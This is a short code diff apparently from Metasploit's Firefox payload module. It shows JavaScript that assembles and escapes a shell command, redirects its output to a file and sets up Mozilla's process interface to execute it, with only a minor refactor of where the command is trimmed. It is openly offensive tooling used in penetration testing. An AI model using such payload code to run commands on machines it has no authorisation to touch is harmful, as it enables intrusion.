@@ -175,14 +175,16 @@ module Msf::Payload::Firefox
         stdout.append(stdoutFile);
 
         var shell;
+        cmd = cmd.trim();
         if (windows) {
-          shell = shPath+" "+cmd.trim();
+          shell = shPath+" "+cmd;
           shell = shPath+" "+shell.replace(/\\W/g, shEsc)+" >"+stdout.path+" 2>&1";
           var b64 = svcs.btoa(shell);
         } else {
           shell = shPath+" "+cmd.replace(/\\W/g, shEsc);
           shell = shPath+" "+shell.replace(/\\W/g, shEsc) + " >"+stdout.path+" 2>&1";
         }
+
         var process = Components.classes["@mozilla.org/process/util;1"]
           .createInstance(Components.interfaces.nsIProcess);
         var sh = Components.classes["@mozilla.org/file/local;1"]
